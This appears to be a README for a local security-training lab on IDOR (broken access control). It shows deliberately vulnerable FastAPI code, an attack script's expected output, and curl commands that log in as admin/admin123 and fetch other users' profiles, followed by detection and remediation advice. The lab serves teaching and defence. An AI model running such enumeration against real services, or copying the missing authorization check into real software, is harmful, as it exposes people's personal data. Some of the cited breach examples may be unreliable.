# IDOR (Insecure Direct Object Reference) Attack

## ðŸŽ¯ Vulnerability

The `/profile/{user_id}` endpoint **does not validate** if the authenticated user has permission to access the requested `user_id`. This allows any authenticated user to access **any other user's profile**.

**OWASP**: A01:2021 - Broken Access Control

## âš ï¸ Impact

- **Complete privacy breach**: Access to all user profiles
- **Sensitive data exposure**: SSN, credit cards, phone numbers, addresses
- **Identity theft risk**: Full personal information leaked
- **Compliance violations**: GDPR, PCI DSS, HIPAA

## ðŸ“– What is IDOR?

**Insecure Direct Object Reference (IDOR)** occurs when an application exposes a reference to an internal implementation object (like a database key) without proper authorization checks.

### Example

```http
GET /api/users/profile/1  # User 1's profile
GET /api/users/profile/2  # User 2's profile (IDOR!)
GET /api/users/profile/3  # User 3's profile (IDOR!)
```

If you're logged in as User 1 but can access User 2's profile â†’ **IDOR vulnerability**

## ðŸš€ Usage

### Prerequisites

```bash
# Install dependencies
pip install -r requirements.txt

# Ensure services are running
docker-compose up -d
```

### Run Attack

```bash
python idor_attack.py
```

### Expected Output

```
==================================================================
ðŸŽ­ IDOR EXPLOITATION ATTACK
==================================================================
Target: http://localhost:8080
Attacking as user: admin
Vulnerability: Missing authorization check in /profile/{user_id}
==================================================================

[*] Step 1: Authenticating...
    [âœ“] Login successful
    [âœ“] MFA verified, got access token

[*] Step 2: Enumerating user IDs (1-5)...
    [âœ“] User ID 1 exists: admin
    [âœ“] User ID 2 exists: user1
    [âœ“] User ID 3 exists: user2
    [âœ“] User ID 4 exists: testuser

[*] Step 3: Exploiting IDOR vulnerability...
    [âœ“] Accessed own profile - User ID 1:
        Username: admin
        ...

    ðŸš¨ IDOR EXPLOIT SUCCESS - User ID 2:
        Username: user1
        Email: user1@devsecops.local
        Role: user
        SSN: 98765432109 âš ï¸ SENSITIVE
        Credit Card: **** **** **** 5678 âš ï¸ SENSITIVE
        ...

ðŸ“Š IDOR ATTACK REPORT
==================================================================
Authenticated as: admin
Total profiles accessed: 4
IDOR exploits (unauthorized): 3
âš ï¸ SENSITIVE DATA COMPROMISED
==================================================================
```

## ðŸ” How It Works

### Attack Flow

```
1. Attacker authenticates â†’ Gets JWT token
2. Accesses own profile â†’ GET /api/users/profile/1 (âœ“ OK)
3. Changes user_id â†’ GET /api/users/profile/2 (ðŸš¨ IDOR!)
4. Server returns data without checking authorization
5. Repeat for all user IDs â†’ Complete data breach
```

### Vulnerable Code

```python
@app.get("/profile/{user_id}")
async def get_profile(user_id: str, authorization: Optional[str] = Header(None)):
    # âŒ NO AUTHORIZATION CHECK HERE!
    user_data = USERS_DB[user_id]
    return UserProfile(**user_data)  # Returns data to anyone
```

### Secure Code (Fixed)

```python
@app.get("/profile/{user_id}")
async def get_profile(
    user_id: str,
    current_user: Dict = Depends(get_current_user)  # âœ… Verify JWT
):
    # âœ… AUTHORIZATION CHECK
    if current_user["sub"] != user_id and current_user["role"] != "admin":
        raise HTTPException(403, "Forbidden: Cannot access other user's profile")
    
    user_data = USERS_DB[user_id]
    return UserProfile(**user_data)
```

## ðŸ“Š Detection

The attack is tracked in metrics:

```promql
# IDOR attempts
user_service_idor_attempts_total{authenticated_user="admin",target_user="user1",result="success"}
```

**Check logs**:
```bash
docker-compose logs user-service | grep "IDOR EXPLOIT"
```

**Output**:
```
ðŸš¨ IDOR EXPLOIT: User 'admin' accessed profile of 'user1' (user_id: 2)
```

## ðŸ›¡ï¸ Remediation

### 1. Add Authorization Check

```python
def check_authorization(authenticated_user: str, requested_user_id: str, role: str) -> bool:
    """Verify user can access the resource"""
    # User can access own profile
    if authenticated_user == requested_user_id:
        return True
    
    # Admin can access any profile
    if role == "admin":
        return True
    
    return False
```

### 2. Use Indirect References

Instead of sequential IDs:
```python
# âŒ BAD: Sequential, predictable
GET /profile/1
GET /profile/2

# âœ… GOOD: UUID, non-guessable
GET /profile/a7f8c3e2-9d1b-4a5c-8e6f-2b3d4a5c6e7f
```

### 3. Implement RBAC

```python
@app.get("/profile/{user_id}")
@require_permission("profile:read:own")  # User can read own
@require_permission("profile:read:all")  # Admin can read all
async def get_profile(user_id: str):
    ...
```

### 4. Redact Sensitive Data

```python
def redact_sensitive_data(profile: UserProfile, viewer_role: str):
    """Hide sensitive fields based on viewer role"""
    if viewer_role != "admin":
        profile.ssn = "***-**-****"
        profile.credit_card = "**** **** **** " + profile.credit_card[-4:]
    return profile
```

## ðŸ§ª Manual Testing

### Test IDOR Vulnerability

```bash
# 1. Login and get token
TOKEN=$(curl -s -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.access_token')

# 2. Access own profile (OK)
curl http://localhost:8080/api/users/profile/1 \
  -H "Authorization: Bearer $TOKEN"

# 3. Access other user's profile (IDOR!)
curl http://localhost:8080/api/users/profile/2 \
  -H "Authorization: Bearer $TOKEN"
```

**If step 3 returns data â†’ IDOR vulnerability exists**

## ðŸ“š Real-World Examples

### Famous IDOR Breaches

1. **Facebook** (2013): 18 million records exposed via IDOR
2. **Instagram** (2019): Account takeover via IDOR
3. **GitHub** (2020): Private repository access via IDOR
4. **British Airways** (2021): Customer data leak

### Common IDOR Patterns

| Endpoint | Vulnerable Parameter | Risk |
|----------|---------------------|------|
| `/user/{id}` | `id` | Profile access |
| `/order/{order_id}` | `order_id` | Financial data |
| `/document/{doc_id}` | `doc_id` | Document theft |
| `/api/v1/messages/{msg_id}` | `msg_id` | Private messages |

## ðŸ’¡ OWASP Top 10 Reference

**A01:2021 â€“ Broken Access Control**

> "94% of applications were tested for some form of broken access control with the average incidence rate of 3.81%"

**Prevention**:
- Deny by default
- Implement access control checks
- Log access control failures
- Rate limit API access
- Invalidate tokens on logout

## ðŸ“– References

- [OWASP IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference_(IDOR))
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
- [CWE-639](https://cwe.mitre.org/data/definitions/639.html)

---

**DISCLAIMER**: Educational purposes only. Do not use against systems you don't own.

